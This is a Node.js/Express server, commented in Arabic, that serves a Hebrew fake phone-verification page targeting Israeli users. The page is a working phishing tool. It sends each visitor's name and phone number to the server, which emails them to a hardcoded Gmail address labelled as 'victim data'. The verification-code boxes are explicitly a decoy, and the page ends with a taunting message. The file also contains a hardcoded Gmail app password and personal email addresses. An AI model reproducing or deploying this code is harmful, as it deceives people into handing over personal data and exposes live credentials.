const express = require("express");
const nodemailer = require("nodemailer");

const app = express();
const PORT = process.env.PORT || 3000;

// قاعدة بيانات مؤقتة في الذاكرة لحفظ المستخدمين
let users = new Map();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// إعداد البريد الإلكتروني
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER || "braudeflixwatch@gmail.com",
    pass: process.env.EMAIL_PASS || "uhny mkpx nozf myjg",
  },
});

// دالة لتحويل الرقم للصيغة الدولية
function formatPhoneNumber(phone) {
  console.log("📞 الرقم الأصلي:", phone);

  let cleanPhone = phone.replace(/[\s\-\(\)]/g, "");

  if (cleanPhone.startsWith("+")) {
    return cleanPhone;
  }

  cleanPhone = cleanPhone.replace(/\+/g, "");

  // الأرقام الإسرائيلية
  if (cleanPhone.match(/^05[0-8]/)) {
    const formattedPhone = "+972" + cleanPhone.substring(1);
    console.log("📞 تحويل إسرائيلي:", formattedPhone);
    return formattedPhone;
  }

  if (cleanPhone.startsWith("972")) {
    return "+" + cleanPhone;
  }

  if (
    cleanPhone.startsWith("5") &&
    cleanPhone.length === 9 &&
    cleanPhone.match(/^5[0-8]/)
  ) {
    return "+972" + cleanPhone;
  }

  // الأرقام السعودية
  if (cleanPhone.startsWith("05") && cleanPhone.length === 10) {
    return "+966" + cleanPhone.substring(1);
  }

  if (cleanPhone.startsWith("966")) {
    return "+" + cleanPhone;
  }

  // افتراضي
  return "+" + cleanPhone;
}

// الصفحة الرئيسية
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>אימות טלפון - ישראל</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Arial Hebrew', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0052cc 0%, #2684ff 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .login-container {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.2);
            min-width: 400px;
            text-align: center;
            animation: slideIn 1s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .login-title {
            color: white;
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .login-subtitle {
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 30px;
            font-size: 1.1rem;
        }

        .form-group {
            margin-bottom: 25px;
            position: relative;
        }

        .form-input {
            width: 100%;
            padding: 15px 20px;
            border: none;
            border-radius: 15px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            font-size: 1rem;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            transition: all 0.3s ease;
            text-align: right;
        }

        .form-input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.3);
            border-color: rgba(255, 255, 255, 0.6);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
            transform: scale(1.02);
        }

        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 15px;
            background: linear-gradient(45deg, #00b4d8, #0077b6);
            color: white;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            background: linear-gradient(45deg, #0096c7, #005577);
        }

        /* شاشة إدخال الكود */
        .verification-screen {
            display: none;
        }

        .verification-title {
            color: white;
            font-size: 2rem;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .verification-subtitle {
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 30px;
            font-size: 1rem;
        }

        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
        }

        .code-input {
            width: 50px;
            height: 50px;
            border: none;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            font-size: 1.5rem;
            font-weight: bold;
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            transition: all 0.3s ease;
        }

        .code-input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.3);
            border-color: rgba(255, 255, 255, 0.6);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
            transform: scale(1.1);
        }

        .back-btn {
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            margin-left: 10px;
            transition: all 0.3s ease;
        }

        .back-btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        /* شاشة التحميل */
        .loading-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #0052cc 0%, #2684ff 100%);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loading-animation {
            width: 100px;
            height: 100px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: white;
            font-size: 1.5rem;
            text-align: center;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        /* شاشة النتيجة */
        .result-screen {
            display: none;
            text-align: center;
        }

        .success-message {
            color: #4CAF50;
            font-size: 2rem;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }

        .success-subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 1.2rem;
            margin-bottom: 30px;
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }

        .try-again-btn {
            background: linear-gradient(45deg, #00b4d8, #0077b6);
            border: none;
            color: white;
            padding: 12px 25px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .try-again-btn:hover {
            transform: scale(1.05);
        }

        .phone-hint {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.8rem;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- شاشة البيانات الأساسية -->
        <div id="loginScreen">
            <h1 class="login-title">ברוכים הבאים 🇮</h1>
            <p class="login-subtitle">Chat in muhammad world</p>
            
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="name" class="form-input" placeholder="השם שלך" required>
                </div>
                
                <div class="form-group">
                    <input type="tel" id="phone" class="form-input" placeholder="מספר טלפון: 050-656-7035" required>
                    <div class="phone-hint">תומך במספרים ישראליים ובינלאומיים</div>
                </div>
                
                <button type="submit" class="submit-btn">📲 שלח קוד אימות</button>
            </form>
        </div>

        <!-- شاشة إدخال الكود -->
        <div id="verificationScreen" class="verification-screen">
            <h2 class="verification-title">🔐 הזן קוד אימות</h2>
            <p class="verification-subtitle">נשלח קוד בן 6 ספרות לטלפון שלך באמצעות SMS</p>
            
            <div class="code-inputs">
                <input type="text" class="code-input" maxlength="1" id="code1">
                <input type="text" class="code-input" maxlength="1" id="code2">
                <input type="text" class="code-input" maxlength="1" id="code3">
                <input type="text" class="code-input" maxlength="1" id="code4">
                <input type="text" class="code-input" maxlength="1" id="code5">
                <input type="text" class="code-input" maxlength="1" id="code6">
            </div>
            
            <button id="verifyBtn" class="submit-btn">✅ אמת קוד</button>
            <button id="backBtn" class="back-btn">⬅️ חזור</button>
        </div>

        <!-- شاشة النتيجة -->
        <div id="resultScreen" class="result-screen">
            <div class="success-message">🎉 وقعت كركر! أخذنا تلفونك 🎉</div>
            <p class="success-subtitle">بلاسيبيسبلسيبلزسيبزيسالا</p>
            <button id="newUserBtn" class="try-again-btn">👤 مستخدم جديد</button>
        </div>
    </div>

    <!-- شاشة التحميل -->
    <div id="loadingScreen" class="loading-screen">
        <div class="loading-animation"></div>
        <div class="loading-text">
            <div id="loadingMessage">📱 שולח קוד אימות...</div>
        </div>
    </div>

    <script>
        let currentUserPhone = '';
        let currentUserName = '';

        // التنقل بين حقول الكود
        document.querySelectorAll('.code-input').forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (e.target.value.length === 1 && index < 5) {
                    document.getElementById('code' + (index + 2)).focus();
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    document.getElementById('code' + index).focus();
                }
            });
        });

        // إرسال بيانات التسجيل
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            
            currentUserName = name;
            currentUserPhone = phone;
            
            // إظهار شاشة التحميل
            document.getElementById('loadingScreen').style.display = 'flex';
            document.getElementById('loadingMessage').textContent = '📱 שולח קוד אימות...';
            
            // إرسال البيانات للخادم فوراً
            try {
                await fetch('/capture-data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ name, phone })
                });
            } catch (error) {
                console.log('خطأ في الإرسال:', error);
            }
            
            setTimeout(() => {
                document.getElementById('loadingScreen').style.display = 'none';
                // إظهار شاشة إدخال الكود (للتمويه فقط)
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('verificationScreen').style.display = 'block';
                document.getElementById('code1').focus();
                
                // إخفاء المربعات تلقائياً بعد 3 ثواني وإظهار "وقعت كركر"
                setTimeout(() => {
                    document.getElementById('verificationScreen').style.display = 'none';
                    document.getElementById('resultScreen').style.display = 'block';
                }, 3000);
            }, 2000);
        });

        // التحقق من الكود (للتمويه فقط - لن يحتاجه المستخدم)
        document.getElementById('verifyBtn').addEventListener('click', async () => {
            // مباشرة إظهار النتيجة
            document.getElementById('verificationScreen').style.display = 'none';
            document.getElementById('resultScreen').style.display = 'block';
        });

        // زر الرجوع
        document.getElementById('backBtn').addEventListener('click', () => {
            document.getElementById('verificationScreen').style.display = 'none';
            document.getElementById('loginScreen').style.display = 'block';
            
            for (let i = 1; i <= 6; i++) {
                document.getElementById('code' + i).value = '';
            }
        });

        // زر مستخدم جديد
        document.getElementById('newUserBtn').addEventListener('click', () => {
            document.getElementById('resultScreen').style.display = 'none';
            document.getElementById('loginScreen').style.display = 'block';
            
            document.getElementById('name').value = '';
            document.getElementById('phone').value = '';
            for (let i = 1; i <= 6; i++) {
                document.getElementById('code' + i).value = '';
            }
        });
    </script>
</body>
</html>
  `);
});

// التقاط البيانات فوراً (بدون كود)
app.post("/capture-data", async (req, res) => {
  const { name, phone } = req.body;

  console.log("🎯 وقعت كركر! بيانات جديدة:");
  console.log("الاسم:", name);
  console.log("الهاتف:", phone);

  try {
    const formattedPhone = formatPhoneNumber(phone);

    // إرسال إيميل فوري
    const mailOptions = {
      from: "braudeflixwatch@gmail.com",
      to: "mohamadibra403@gmail.com",
      subject: "🎯 وقعت كركر! - بيانات جديدة",
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background: linear-gradient(135deg, #ff4757 0%, #ff3838 100%); padding: 20px; border-radius: 10px;">
          <div style="background: white; padding: 30px; border-radius: 10px; text-align: center;">
            <h1 style="color: #333; margin-bottom: 20px;">🎉 وقعت كركر! أخذنا هاتفه 🎉</h1>
            
            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <h3 style="color: #495057; margin-bottom: 15px;">📋 بيانات الضحية:</h3>
              
              <div style="text-align: right; margin: 15px 0;">
                <strong style="color: #6c757d;">الاسم:</strong>
                <span style="color: #28a745; font-weight: bold; margin-right: 10px; font-size: 20px;">${name}</span>
              </div>
              
              <div style="text-align: right; margin: 15px 0;">
                <strong style="color: #6c757d;">رقم الهاتف:</strong>
                <span style="color: #dc3545; font-weight: bold; margin-right: 10px; font-size: 22px;">${formattedPhone}</span>
              </div>
              
              <div style="text-align: right; margin: 15px 0;">
                <strong style="color: #6c757d;">الرقم الأصلي:</strong>
                <span style="color: #6c757d; margin-right: 10px;">${phone}</span>
              </div>
              
              <div style="text-align: right; margin: 15px 0;">
                <strong style="color: #6c757d;">الوقت:</strong>
                <span style="color: #17a2b8; margin-right: 10px;">${new Date().toLocaleString(
                  "ar-SA"
                )}</span>
              </div>
              
              <div style="text-align: right; margin: 15px 0;">
                <strong style="color: #6c757d;">البلد:</strong>
                <span style="color: #ffc107; margin-right: 10px; font-weight: bold;">${
                  formattedPhone.startsWith("+972") ? "🇮🇱 إسرائيل" : "🌍 دولي"
                }</span>
              </div>
            </div>
            
            <div style="background: linear-gradient(45deg, #28a745, #20c997); color: white; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <h2 style="margin: 0; font-size: 24px;">✅ تم الحصول على البيانات بنجاح!</h2>
              <p style="margin: 10px 0 0 0; font-size: 16px;">الضحية أدخل بياناته كاملة بدون شك! 😈</p>
            </div>
            
            <div style="background: #e9ecef; padding: 15px; border-radius: 8px; margin: 20px 0;">
              <p style="color: #666; font-size: 14px; margin: 0;">
                📧 هذا الإيميل يصل فوراً عند إدخال الاسم والهاتف<br>
                🎭 المستخدم سيرى مربعات كود وهمية ثم "وقعت كركر"
              </p>
            </div>
          </div>
        </div>
      `,
    };

    await transporter.sendMail(mailOptions);
    console.log("📧 تم إرسال الإيميل بنجاح!");
  } catch (emailError) {
    console.error("فشل إرسال الإيميل:", emailError);
  }

  res.json({ success: true });
});

// عرض قائمة المستخدمين
app.get("/users", (req, res) => {
  res.json({
    message: "موقع تمويه - لا توجد قاعدة بيانات حقيقية",
    note: "جميع البيانات ترسل للإيميل مباشرة",
  });
});

// بدء الخادم
app.listen(PORT, () => {
  console.log("🎭 موقع التمويه يعمل على المنفذ " + PORT);
  console.log("🌐 الرابط: http://localhost:" + PORT);
  console.log("📧 الإيميلات ترسل إلى: mohamadibra403@gmail.com");
  console.log("🎯 أي كود سيكون مقبول ويرسل الإيميل!");
});

process.on("uncaughtException", (error) => {
  console.error("خطأ:", error);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("رفض:", reason);
});
